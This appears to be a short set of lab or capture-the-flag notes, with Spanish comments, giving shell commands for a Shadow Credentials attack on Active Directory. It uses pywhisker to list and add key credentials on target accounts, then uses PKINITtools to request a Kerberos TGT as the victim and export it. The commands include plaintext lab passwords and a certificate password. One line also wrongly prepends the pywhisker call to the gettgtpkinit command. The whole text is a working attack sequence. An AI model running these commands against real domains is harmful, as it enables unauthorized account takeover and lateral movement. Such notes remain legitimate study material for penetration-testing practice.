```shell
#LISTAR
python3 pywhisker.py -d certified.htb -u judith.mader -p 'judith09' --target 'MANAGEMENT_SVC' --action "list" --dc-ip 10.10.11.41

#AÑADIR
python3 pywhisker.py -d haero -u hrapp-service -p 'Untimed$Runny' --target 'Hazel.Green' --action "add" --dc-ip 192.168.154.40

#SOLICITAMOS EL TGT
python3 pywhisker.py ../PKINITtools/gettgtpkinit.py -cert-pfx N0cgHzlh.pfx -pfx-pass inlZifTfqm2EwG6Q0aPd  haero/hazel.green user.ccache -dc-ip 192.168.154.40

#LO EXPORTAMOS
export KRB5CCNAME=$PWD/user.ccache
```